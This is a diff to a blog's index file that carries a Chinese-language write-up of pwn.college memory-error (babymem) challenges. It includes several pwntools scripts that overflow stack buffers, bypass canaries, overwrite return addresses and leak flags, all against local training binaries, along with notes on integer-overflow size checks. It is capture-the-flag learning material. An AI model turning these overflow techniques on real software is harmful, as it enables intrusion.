@@ -3344,6 +3344,7 @@ shellcode += shellcraft.amd64.write(1, stack + 0x100, 0x100)
     <title>MemoryErrors</title>
     <url>/2022/03/03/MemoryErrors/</url>
     <content><![CDATA[<html><head></head><body><p>​        视频主要介绍了栈溢出及其保护。保护的绕过包括canary和pie，并没有提到NX（那个似乎在后面一个module）</p>
+<p>​        传输题目到本地可以使用<code>scp</code>命令。</p>
 <pre><code class="bash">scp -i key -r hacker@dojo.pwn.college:/challenge/babymem_level4.1 /Users/rin/ctf/pwn/pwn_college/MemoryErrors
 </code></pre>
 <h4 id="Level1-0">Level1.0<a class="post-anchor" href="#Level1-0"></a></h4><p>​        随便溢，覆盖掉变量就行。</p>
@@ -3404,11 +3405,8 @@ p = process("/challenge/babymem_level4.0")
 win_addr = 0x401B88
 payload = b"a"*40+ p64(win_addr)
 
-
 p.sendline(b"-999")
-
 #gdb.attach(p)
-
 p.send(payload)
 
 p.interactive()
@@ -3429,7 +3427,6 @@ p = process("/challenge/babymem_level4.1")
 win_addr = 0x4016A3
 payload = b"a"*56+ p64(win_addr)
 
-
 p.sendline(b"-999")
 #gdb.attach(p)
 p.send(payload)
@@ -3440,20 +3437,12 @@ p.interactive()
 <pre><code class="c">if ( v31 * v32 &gt; 7 )
     sub_401150("record_size * record_num &lt; (unsigned int) sizeof(input)", "&lt;stdin&gt;", 143LL, "challenge");
 </code></pre>
-<p>​        <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8B%E5%8D%884.53.24.png" data-caption="截屏2022-03-05 下午4.53.24" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8B%E5%8D%884.53.24.png" alt="截屏2022-03-05 下午4.53.24"></a></p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8B%E5%8D%884.53.36.png" data-caption="截屏2022-03-05 下午4.53.36" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8B%E5%8D%884.53.36.png" alt="截屏2022-03-05 下午4.53.36"></a></p>
-<p>​        注意到这几个变量都是无符号整数。</p>
-<pre><code class="c">  sub_4011A0("%u", &amp;v32);
-</code></pre>
-<p>​        第一次读取的时候输入负数会被储存成正数（非常大）</p>
-<p>​        size的输入同理。</p>
-<p>​        然后相乘计算总共能输入的size。</p>
+<p>​    </p>
 <p>​        然后虽然可以输入负数，但是如果随便输的话会导致溢出到下一个payload的read的buffer，导致输入不了，程序直接爆炸。真的非常逆天。        </p>
-<p>​        4294967296是0，-1是4294967295，所以需要让v47为小于7的数，但是总之非常烦的是v47v3132都是uint，没有类型转换的话似乎溢出了也意义不大。唯一有可能的就是ida识别错误了，这里只有v32在相乘时会被强制类型转换。</p>
-<p>​        从目前的结果来说好像也并不矛盾，那么以这个思路来想的话，</p>
-<p>2147483647</p>
-<p>​        所以需要让两个int相乘的时候小于7（可以为负）。然后当v32位uint的时候变得很大。</p>
-<p>​        不知道怎么做。</p>
+<p>​        4294967297是1，</p>
+<p>​        18446744073709551617</p>
+<p>2147483649</p>
+<p>​        去找了一下官方的teaching，发现思路其实并不是uint与int之间的强制类型转换，而是uint32和uint64之间强制类型转换导致的溢出。除了最后的size计算时，将v33转化成uint64，其他的变量都是uint32，<a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.15.22.png" data-caption="截屏2022-03-07 下午4.15.22" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.15.22.png" alt="截屏2022-03-07 下午4.15.22"></a></p>
 <p>Level6.0</p>
 <p>​        利用gadget的思想，直接将地址填成flag，而绕过win的检测。</p>
 <pre><code class="python">from pwn import*
@@ -3550,11 +3539,11 @@ p.interactive()
 #p = process("./babymem_level8.0")
 p = process("/challenge/babymem_level8.0")
 
-#pad = 0x401B5 #0x30
+
 payload = b'\x00'*152 + b"\xa4\xb0"
 p.sendline("160")
 p.recv()
-#gdb.attach(p)
+
 p.send(payload)
 
 
@@ -3599,7 +3588,7 @@ p.interactive()
 p = process("/challenge/babymem_level9.1")
 
 payload = b'a'*40+b"\x47"+ b"\x26\x46"
-#80+8 canary:16
+
 p.sendline("77")
 p.recv()
 
@@ -3608,7 +3597,68 @@ p.send(payload)
 p.interactive()
 </code></pre>
 <p>​        n的数量和size都需要精准控制才能拿flag。</p>
-<h4 id="Level10-0">Level10.0<a class="post-anchor" href="#Level10-0"></a></h4></body></html>]]></content>
+<h4 id="Level10-0">Level10.0<a class="post-anchor" href="#Level10-0"></a></h4><p>​        其实虽然盯着伪代码盯了很久但是感觉并没有实际理解这道题。目前我的疑惑有二：</p>
+<ol>
+<li>为什么flag被load进了内存，并且也给出了它在栈中实际的地址，但是栈上对应的地址显示的是0.</li>
+<li>这道题的思路应该是通过后面那个you say来打印flag，但是如何将payload的指针覆盖为flag的指针？    </li>
+</ol>
+<p>​    </p>
+<p>​        解答一下，第一个问题其实很不应该，显示为0就是因为没有权限。然后第二个问题，覆盖payload指针的思路至少不应该在这个module出现，这道题的漏洞点就是payload的区域和flag的区域在栈上是连续的，只要覆盖掉截断payload的输出的空字符就可以一直输出栈上的内容，包括flag。</p>
+<p>​        ps，包括其他题也是，如果有疑惑其实可以找一下官方的teaching视频（但是也有很多没有就是了）</p>
+<p>​        </p>
+<pre><code class="python">from pwn import*
+
+
+p = process("/challenge/babymem_level10.0")
+
+payload =  b'a'*111
+
+p.sendline(b"150")
+
+
+p.send(payload)
+</code></pre>
+<h4 id="Level10-1">Level10.1<a class="post-anchor" href="#Level10-1"></a></h4><p>​        同</p>
+<pre><code class="python">from pwn import*
+
+p = process("/challenge/babymem_level10.1")
+
+payload =  b'a'*79
+
+p.sendline(b"150")
+p.send(payload)
+
+
+p.interactive()
+
+</code></pre>
+<h4 id="Level11-0">Level11.0<a class="post-anchor" href="#Level11-0"></a></h4><p>​        也是类似的思路，但是这里倒不是栈地址了，不过区别不大，只是输入的payload大些。</p>
+<pre><code class="python">from pwn import*
+
+p = process("/challenge/babymem_level11.0")
+#payload = b'a'*40+b"\x48"+ b"a"*2
+payload =  b'a'*24577
+
+p.sendline(b"24600")
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<h4 id="level11-1">level11.1<a class="post-anchor" href="#level11-1"></a></h4><p>​        同理</p>
+<p>​    （ps：size是我随便填的。但是也不能太随便，得先<code>vmmap</code>看看flag和input buffer被映射到了哪里）</p>
+<pre><code class="python">from pwn import*
+
+p = process("/challenge/babymem_level11.1")
+
+payload =  b'a'*12289
+
+p.sendline(b"12400")
+p.send(payload)
+
+p.interactive()
+
+</code></pre>
+<h4 id="level12-0">level12.0<a class="post-anchor" href="#level12-0"></a></h4><h4 id="level12-1">level12.1<a class="post-anchor" href="#level12-1"></a></h4><h4 id="level13-0">level13.0<a class="post-anchor" href="#level13-0"></a></h4><h4 id="level13-1">level13.1<a class="post-anchor" href="#level13-1"></a></h4><h4 id="level14-0">level14.0<a class="post-anchor" href="#level14-0"></a></h4><h4 id="level14-1">level14.1<a class="post-anchor" href="#level14-1"></a></h4><h4 id="level15-0">level15.0<a class="post-anchor" href="#level15-0"></a></h4><h4 id="level15-1">level15.1<a class="post-anchor" href="#level15-1"></a></h4></body></html>]]></content>
       <tags>
         <tag>pwncollege</tag>
       </tags>
